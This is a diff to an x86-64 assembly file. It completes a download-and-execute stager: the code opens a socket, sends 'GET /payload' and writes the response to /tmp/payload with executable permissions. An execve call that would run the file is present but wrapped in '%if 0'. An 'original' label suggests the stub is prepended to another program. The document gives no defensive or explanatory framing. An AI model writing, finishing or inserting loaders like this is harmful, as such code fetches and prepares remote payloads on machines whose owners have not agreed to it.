@@ -14,7 +14,7 @@ _start:
     mov rsi, 1
     xor rdx, rdx
     syscall
-    mov rbx, rax ; save socketfd
+    mov rbx, rax ; save socketfd in rbx
 
     mov rdi, rbx ; socketfd
     mov rax, 42 ; sys_connect
@@ -42,19 +42,54 @@ _start:
     sub rsp, 4096 ; allocate 4096 bytes
     mov rsi, rsp
     mov rdx, 4096
-    syscall ; rax = bytes_read
+    syscall
+    mov rbp, rax ; save bytes_read in rbp
 
     ; open("/tmp/payload", O_CREAT|O_WRONLY|O_TRUNC, 0755)
+    mov rax, 2
+    lea rdi, [rel path]
+    ; O_CREAT = 512 (create file)
+    ; O_WRONLY = 1 (write file)
+    ; O_TRUNC = 1024 (remove old content 
+    mov rsi, 1537
+    mov rdx, 0755 ; make executable
+    syscall ; rax will have filefd
+    mov r12, rax ; save filefd in r12
 
     ; fchmod(filefd, 0755)
+    mov rax, 91
+    mov rdi, r12
+    mov rsi, 0755
+    syscall
     
-    ; write(socketfd, buffer, bytes_read)
+    ; write(filefd, buffer, bytes_read)
+    mov rax, 1
+    mov rdi, r12
+    mov rsi, rsp
+    mov rdx, rbp
+    syscall
 
     ; close(filefd)
+    mov rax, 3
+    mov rdi, r12
+    syscall
 
     ; close(socketfd)
+    mov rax, 3
+    mov rdi, rbx
+    syscall
 
+    %if 0
     ; execve("/tmp/payload", ["/tmp/payload", null], null)
+    xor rax, rax
+    push rax
+    lea rdi, [rel path]
+    push rdi
+    mov rsi, rsp
+    xor rdx, rdx
+    mov rax, 59
+    syscall
+    %endif
 
 original:
     mov rax, 1 ; sys_write
@@ -71,7 +106,7 @@ text:
 text_end:
 
 request:
-    db "GET /payload HTTP/1.0", 0x0D, 0x0A, 0x0D, 0x0A ; "GET /payload HTTP/1.0\r\n\r\n"
+    db "GET /payload HTTP/1.1", 0x0D, 0x0A, 0x0D, 0x0A ; "GET /payload HTTP/1.1\r\n\r\n"
 request_end:
 
 path:
